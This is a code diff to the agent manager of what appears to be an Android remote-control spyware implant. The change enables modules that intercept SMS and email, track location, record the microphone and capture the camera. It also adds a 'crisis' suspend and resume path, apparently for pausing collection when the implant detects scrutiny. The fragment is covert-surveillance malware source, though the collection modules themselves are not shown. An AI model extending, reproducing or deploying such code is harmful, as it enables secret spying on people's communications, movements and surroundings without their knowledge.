@@ -28,7 +28,6 @@ public class AgentManager extends Manager<AgentBase> {
 	/** The singleton. */
 	private volatile static AgentManager singleton;
 
-
 	/**
 	 * Self.
 	 * 
@@ -47,7 +46,7 @@ public class AgentManager extends Manager<AgentBase> {
 	}
 
 	/**
-	 * factory() Add agent id defined by "key" into the running map. If the
+	 * mapAgent() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
 	 * 
 	 * @param key
@@ -62,61 +61,67 @@ public class AgentManager extends Manager<AgentBase> {
 		}
 
 		switch (key) {
-			case AgentConf.AGENT_SMS:
-				break;
-	
-			case AgentConf.AGENT_TASK:
-				break;
-	
-			case AgentConf.AGENT_CALLLIST:
-				break;
-	
-			case AgentConf.AGENT_DEVICE:
-				a = new DeviceAgent();
-				break;
-	
-			case AgentConf.AGENT_POSITION:
-				break;
-	
-			case AgentConf.AGENT_CALL:
-				break;
-	
-			case AgentConf.AGENT_CALL_LOCAL:
-				break;
-	
-			case AgentConf.AGENT_KEYLOG:
-				break;
-	
-			case AgentConf.AGENT_SNAPSHOT:
-				a = new SnapshotAgent();
-				break;
-	
-			case AgentConf.AGENT_URL:
-				break;
-	
-			case AgentConf.AGENT_IM:
-				break;
-	
-			case AgentConf.AGENT_EMAIL:
-				break;
-	
-			case AgentConf.AGENT_MIC:
-				break;
-	
-			case AgentConf.AGENT_CAM:
-				break;
-	
-			case AgentConf.AGENT_CLIPBOARD:
-				break;
-	
-			case AgentConf.AGENT_CRISIS:
-				break;
-	
-			case AgentConf.AGENT_APPLICATION:
-				break;
-	
-			default:
-				break;
+		case AgentConf.AGENT_SMS:
+			a = new MessageAgent();
+			break;
+
+		case AgentConf.AGENT_TASK:
+			break;
+
+		case AgentConf.AGENT_CALLLIST:
+			break;
+
+		case AgentConf.AGENT_DEVICE:
+			a = new DeviceAgent();
+			break;
+
+		case AgentConf.AGENT_POSITION:
+			a = new PositionAgent();
+			break;
+
+		case AgentConf.AGENT_CALL:
+			break;
+
+		case AgentConf.AGENT_CALL_LOCAL:
+			break;
+
+		case AgentConf.AGENT_KEYLOG:
+			break;
+
+		case AgentConf.AGENT_SNAPSHOT:
+			a = new SnapshotAgent();
+			break;
+
+		case AgentConf.AGENT_URL:
+			break;
+
+		case AgentConf.AGENT_IM:
+			break;
+
+		case AgentConf.AGENT_EMAIL:
+			a = new MessageAgent();
+			break;
+
+		case AgentConf.AGENT_MIC:
+			a = new MicAgent();
+			break;
+
+		case AgentConf.AGENT_CAM:
+			a = new CameraAgent();
+			break;
+
+		case AgentConf.AGENT_CLIPBOARD:
+			break;
+
+		case AgentConf.AGENT_CRISIS:
+			a = new CrisisAgent();
+			break;
+
+		case AgentConf.AGENT_APPLICATION:
+			break;
+
+		default:
+			break;
 		}
 
 		if (a != null) {
@@ -136,12 +141,12 @@ public class AgentManager extends Manager<AgentBase> {
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return false;
 		}
 
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return false;
 		}
 
@@ -155,7 +160,7 @@ public class AgentManager extends Manager<AgentBase> {
 		return true;
 	}
 
-	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
+	// Deve essere bloccante. Attende l'effettivo stop di tutto.
 	/**
 	 * Stop agents.
 	 */
@@ -168,6 +173,9 @@ public class AgentManager extends Manager<AgentBase> {
 			final Integer key = it.next();
 			stop(key);
 		}
+		
+		running.clear();
+		threads.clear();
 	}
 
 	/**
@@ -182,12 +190,12 @@ public class AgentManager extends Manager<AgentBase> {
 		agents = status.getAgentsMap();
 
 		if (agents == null) {
-			Log.d("RCS", "Agents map null");
+			Log.d(TAG, "Agents map null");
 			return;
 		}
 
 		if (running == null) {
-			Log.d("RCS", "Running Agents map null");
+			Log.d(TAG, "Running Agents map null");
 			return;
 		}
 
@@ -199,7 +207,7 @@ public class AgentManager extends Manager<AgentBase> {
 
 		// Agent mapped and running
 		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
-			Log.d("RCS", "Agent " + key + " is already running");
+			Log.d(TAG, "Agent " + key + " is already running");
 			return;
 		}
 
@@ -218,6 +226,7 @@ public class AgentManager extends Manager<AgentBase> {
 		final Thread t = new Thread(a);
 		threads.put(a, t);
 		t.start();
+
 	}
 
 	/**
@@ -228,16 +237,15 @@ public class AgentManager extends Manager<AgentBase> {
 	 */
 	public synchronized void stop(final int key) {
 		final AgentBase a = running.get(key);
-		
 		if (a == null) {
-			Log.d("RCS", "Agent " + key + " not present");
+			Log.d(TAG, "Agent " + key + " not present");
 			return;
 		}
 
 		a.stopThread();
+		running.remove(key);
 
 		final Thread t = threads.get(a);
-		
 		if (t != null) {
 			try {
 				t.join();
@@ -246,14 +254,61 @@ public class AgentManager extends Manager<AgentBase> {
 				e.printStackTrace();
 			}
 		}
-		
 		threads.remove(a);
 	}
 
+	/**
+	 * Suspend an agent, used by crisis
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void suspend(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d(TAG, "Agent " + key + " not present");
+			return;
+		}
 
+		// suspending a thread implies a stop
+		a.suspend();
 
+		final Thread t = threads.get(a);
+		if (t != null) {
+			try {
+				t.join();
+			} catch (final InterruptedException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		threads.remove(a);
 
+	}
 
+	/**
+	 * Resume an agent, only if suspended
+	 * 
+	 * @param key
+	 *            the key
+	 */
+	public void resume(int key) {
+		final AgentBase a = running.get(key);
+		if (a == null) {
+			Log.d(TAG, "Agent " + key + " not present");
+			return;
+		}
 
+		if (a.isSuspended()) {
+			// this clean the suspendend status
+			a.resume();
+
+			// start a new thread and restart the loop.
+			final Thread t = new Thread(a);
+			threads.put(a, t);
+			t.start();
+
+		}
+	}
 
 }
